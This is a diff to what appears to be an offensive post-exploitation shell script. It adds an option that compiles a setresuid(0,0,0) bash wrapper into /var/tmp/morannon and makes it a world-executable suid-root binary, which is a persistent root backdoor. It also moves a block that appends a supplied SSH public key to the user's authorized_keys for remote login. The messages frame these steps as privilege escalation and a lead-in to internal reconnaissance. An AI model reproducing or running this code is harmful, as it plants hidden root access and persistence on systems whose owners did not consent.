@@ -99,7 +99,7 @@ fi
 
 PASSED_ARGS=$@
 if [ "$PASSED_ARGS" != "" ]; then
-  while getopts "he:s:u:p:" opt; do
+  while getopts "he:rs:u:p:" opt; do
     case "$opt" in
       h|\?)
         echo
@@ -107,6 +107,10 @@ if [ "$PASSED_ARGS" != "" ]; then
         echo
         echo "-e <username>"
         echo "  Elevate privileges of the given user"
+        echo "  Root needed!"
+        echo
+        echo "-r"
+        echo "  Create a root shell"
         echo "  Root needed!"
         echo
         echo "-s <ssh public key / content of id_rsa.pub>"
@@ -123,6 +127,7 @@ if [ "$PASSED_ARGS" != "" ]; then
         echo
         exit;;
       e) ELEVATEPRIV="1";PRIVUSER=$OPTARG;;
+      r) ROOTSHELL="1";;
       s) SSH="1";PUBKEY=$OPTARG;;
       u) ADDUSER="1";USERNAME=$OPTARG;;
       p) ADDPW="1";PW=$OPTARG;;
@@ -153,81 +158,6 @@ sleep 1
 
 fuGOT_ROOT
 sleep 1
-
-############
-# SSH Keys #
-############
-
-if [ "$SSH" ]; then
-  echo "
-    __  __           _ _  __         ____ ____  _   _   _  __                      
-   |  \/  | ___   __| (_)/ _|_   _  / ___/ ___|| | | | | |/ /___ _   _ ___         
-   | |\/| |/ _ \ / _\` | | |_| | | | \___ \___ \| |_| | | ' // _ \ | | / __|        
-   | |  | | (_) | (_| | |  _| |_| |  ___) |__) |  _  | | . \  __/ |_| \__ \  
-   |_|  |_|\___/ \__,_|_|_|  \__, | |____/____/|_| |_| |_|\_\___|\__, |___/ 
-                             |___/                               |___/             
-  "
-  sleep 1
-
-  # check if sudo
-  if ([ -f /usr/bin/id ] && [ "$(/usr/bin/id -u)" -eq "0" ]) || [ "`whoami 2>/dev/null`" = "root" ]; then
-    fuERROR "You are root! Don't run part \"modify ssh keys\" (-s) with \"sudo\""
-    echo
-    exit
-  fi
-
-  # check if local ssh server is running
-  fuTITLE "Check if local ssh server is running ..."
-  sleep 2
-  if ps aux | grep sshd | grep -v grep 2>/dev/null; then
-    fuMESSAGE "Local ssh server is running"
-  elif netstat -plant | grep :22 | grep LISTEN 2>/dev/null; then
-    fuMESSAGE "Local ssh server is listening on port 22"
-  else
-    fuERROR "Probably no ssh server running on this host"
-  fi
-
-  # set current user to $USER
-  if WHOAMI=$(command -v whoami 2>/dev/null); then
-    USER=$($WHOAMI 2>/dev/null)
-  else
-    fuERROR "command \"whoami\" not found"
-    # try with who am i
-    #USER=$(who am i | awk '{print $1}' 2>/dev/null)
-  fi
-  
-  # check if $HOME variable is set
-  if [ ! "$HOME" ]; then
-    if [ -d "/home/$USER" ]; then
-      HOME="/home/$USER"
-    fi
-  fi
-  
-  # get local ip addresses
-  LOCAL_IP=$(ip a | grep -vi docker | grep -Eo 'inet[^6]\S+[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | awk '{print $2}' | grep -E "^10\.|^172\.|^192\.168\.|^169\.254\.")
-
-  fuTITLE "Trying to add given ssh public key to authorized_keys file of user \"$USER\" ..."
-  sleep 2
-  if [ -d "$HOME/.ssh" ]; then
-    if echo "$PUBKEY" >> "$HOME"/.ssh/authorized_keys; then TRYCHMOD=""; else SSHOK="" && fuERROR "unable to write authorized_keys" && TRYCHMOD="1"; fi
-    if [ "$TRYCHMOD" ]; then
-      if CHMOD=$(command -v chmod 2>/dev/null); then
-        $CHMOD 700 "$HOME"/.ssh 2>/dev/null
-        echo "$PUBKEY" >> "$HOME"/.ssh/authorized_keys && SSHOK="1" && fuINFO "authorized_keys updated"
-      else 
-        fuERROR "command \"chmod\" not found"
-      fi
-    else
-      SSHOK="1" && echo "authorized_keys updated"
-    fi
-  else
-    fuINFO "No .ssh directory exists, creating one ..."
-    MKDIR=$(command -v mkdir 2>/dev/null) || fuERROR "command \"mkdir\" not found"
-    CHMOD=$(command -v chmod 2>/dev/null) || fuERROR "command \"chmod\" not found"
-    $MKDIR "$HOME"/.ssh 2>/dev/null && $CHMOD 700 "$HOME"/.ssh 2>/dev/null && $CHMOD 600 "$HOME"/.ssh/authorized_keys 2>/dev/null
-    if echo "$PUBKEY" >> "$HOME"/.ssh/authorized_keys; then SSHOK="1" && fuINFO "authorized_keys updated"; else SSHOK="" && fuERROR "unable to write authorized_keys"; fi
-  fi
-fi
 
 
 #################
@@ -334,6 +264,123 @@ if [ "$ELEVATEPRIV" ]; then
 fi
 
 
+############
+# SSH Keys #
+############
+
+if [ "$SSH" ]; then
+  echo "
+    __  __           _ _  __         ____ ____  _   _   _  __                      
+   |  \/  | ___   __| (_)/ _|_   _  / ___/ ___|| | | | | |/ /___ _   _ ___         
+   | |\/| |/ _ \ / _\` | | |_| | | | \___ \___ \| |_| | | ' // _ \ | | / __|        
+   | |  | | (_) | (_| | |  _| |_| |  ___) |__) |  _  | | . \  __/ |_| \__ \  
+   |_|  |_|\___/ \__,_|_|_|  \__, | |____/____/|_| |_| |_|\_\___|\__, |___/ 
+                             |___/                               |___/             
+  "
+  sleep 1
+
+  # check if sudo
+  if ([ -f /usr/bin/id ] && [ "$(/usr/bin/id -u)" -eq "0" ]) || [ "`whoami 2>/dev/null`" = "root" ]; then
+    fuERROR "You are root! Don't run part \"modify ssh keys\" (-s) with \"sudo\""
+    echo
+    exit
+  fi
+
+  # check if local ssh server is running
+  fuTITLE "Check if local ssh server is running ..."
+  sleep 2
+  if ps aux | grep sshd | grep -v grep 2>/dev/null; then
+    fuMESSAGE "Local ssh server is running"
+  elif netstat -plant | grep :22 | grep LISTEN 2>/dev/null; then
+    fuMESSAGE "Local ssh server is listening on port 22"
+  else
+    fuERROR "Probably no ssh server running on this host"
+  fi
+
+  # set current user to $USER
+  if WHOAMI=$(command -v whoami 2>/dev/null); then
+    USER=$($WHOAMI 2>/dev/null)
+  else
+    fuERROR "command \"whoami\" not found"
+    # try with who am i
+    #USER=$(who am i | awk '{print $1}' 2>/dev/null)
+  fi
+  
+  # check if $HOME variable is set
+  if [ ! "$HOME" ]; then
+    if [ -d "/home/$USER" ]; then
+      HOME="/home/$USER"
+    fi
+  fi
+  
+  # get local ip addresses
+  LOCAL_IP=$(ip a | grep -vi docker | grep -Eo 'inet[^6]\S+[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | awk '{print $2}' | grep -E "^10\.|^172\.|^192\.168\.|^169\.254\.")
+
+  fuTITLE "Trying to add given ssh public key to authorized_keys file of user \"$USER\" ..."
+  sleep 2
+  if [ -d "$HOME/.ssh" ]; then
+    if echo "$PUBKEY" >> "$HOME"/.ssh/authorized_keys; then TRYCHMOD=""; else SSHOK="" && fuERROR "unable to write authorized_keys" && TRYCHMOD="1"; fi
+    if [ "$TRYCHMOD" ]; then
+      if CHMOD=$(command -v chmod 2>/dev/null); then
+        $CHMOD 700 "$HOME"/.ssh 2>/dev/null
+        echo "$PUBKEY" >> "$HOME"/.ssh/authorized_keys && SSHOK="1" && fuINFO "authorized_keys updated"
+      else 
+        fuERROR "command \"chmod\" not found"
+      fi
+    else
+      SSHOK="1" && echo "authorized_keys updated"
+    fi
+  else
+    fuINFO "No .ssh directory exists, creating one ..."
+    MKDIR=$(command -v mkdir 2>/dev/null) || fuERROR "command \"mkdir\" not found"
+    CHMOD=$(command -v chmod 2>/dev/null) || fuERROR "command \"chmod\" not found"
+    $MKDIR "$HOME"/.ssh 2>/dev/null && $CHMOD 700 "$HOME"/.ssh 2>/dev/null && $CHMOD 600 "$HOME"/.ssh/authorized_keys 2>/dev/null
+    if echo "$PUBKEY" >> "$HOME"/.ssh/authorized_keys; then SSHOK="1" && fuINFO "authorized_keys updated"; else SSHOK="" && fuERROR "unable to write authorized_keys"; fi
+  fi
+fi
+
+
+#####################
+# Create root shell #
+#####################
+
+if [ "$ROOTSHELL" ]; then
+  echo "
+     ____                _         ____             _     ____  _          _ _ 
+    / ___|_ __ ___  __ _| |_ ___  |  _ \ ___   ___ | |_  / ___|| |__   ___| | |
+   | |   | '__/ _ \/ _\` | __/ _ \ | |_) / _ \ / _ \| __| \___ \| '_ \ / _ \ | |
+   | |___| | |  __/ (_| | ||  __/ |  _ < (_) | (_) | |_   ___) | | | |  __/ | |
+    \____|_|  \___|\__,_|\__\___| |_| \_\___/ \___/ \__| |____/|_| |_|\___|_|_|
+                                                                             
+  "
+
+  TMPDIR="/var/tmp"
+  GCC=$(command -v gcc 2>/dev/null)
+  CHOWN=$(command -v chown 2>/dev/null)
+  CHMOD=$(command -v chmod 2>/dev/null)
+
+  # check if /bin/bash exists
+  if [ -f "/bin/bash" ]; then BASH="1"; else BASH=""; fi
+
+  fuTITLE "Trying to add a shell as a binary with suid bit set ..."
+  sleep 2
+  if [ "$BASH" ]; then
+    echo 'int main(void){setresuid(0, 0, 0);system("/bin/bash");}' > $TMPDIR/morannon.c
+  else
+    echo 'int main(void){setresuid(0, 0, 0);system("/bin/sh");}' > $TMPDIR/morannon.c
+  fi
+  $GCC $TMPDIR/morannon.c -o $TMPDIR/morannon 2>/dev/null
+  rm $TMPDIR/morannon.c
+  
+  if $CHOWN root:root $TMPDIR/morannon && $CHMOD 4777 $TMPDIR/morannon; then
+    ROOTSHELLOK="1" && fuINFO "root shell created"
+  else
+    ROOTSHELLOK="" && fuERROR "root shell not created"
+  fi 
+
+fi
+
+
 ##############
 # Next Steps #
 ##############
@@ -347,15 +394,6 @@ echo "
                                       |_|                                          
 "
 
-if [ "$SSH" ]; then
-  if [ "$SSHOK" ]; then
-    fuSTEPS "authorized_key file updated, if ssh server is running, remote ssh login should be possible to user \"$USER\" with given SSH key pair."
-    for ip in $LOCAL_IP; do
-      fuSTEPS "From your Host: Try \"ssh $USER@$ip\""
-    done
-  fi
-fi
-
 if [ "$ADDUSER" ]; then
   if [ "$ADDUSEROK" ]; then
     fuSTEPS "User $USERNAME added. To login with ssh, switch to the new user (su $USERNAME) and run the script again with -s parameter."
@@ -365,6 +403,21 @@ fi
 if [ "$ELEVATEPRIV" ]; then
   if [ "$ELEVATEPRIVOK" ]; then
     fuSTEPS "You already ran this script with sudo! So skip privilege escalation phase and move on to internal reconnaissance."
+  fi
+fi
+
+if [ "$SSH" ]; then
+  if [ "$SSHOK" ]; then
+    fuSTEPS "authorized_key file updated, if ssh server is running, remote ssh login should be possible to user \"$USER\" with given SSH key pair."
+    for ip in $LOCAL_IP; do
+      fuSTEPS "From your Host: Try \"ssh $USER@$ip\""
+    done
+  fi
+fi
+
+if [ "$ROOTSHELL" ]; then
+  if [ "$ROOTSHELLOK" ]; then
+    fuSTEPS "A local shell was created that gives you root privileges! You can use it as follows: \"$TMPDIR/morannon\"."
   fi
 fi
 
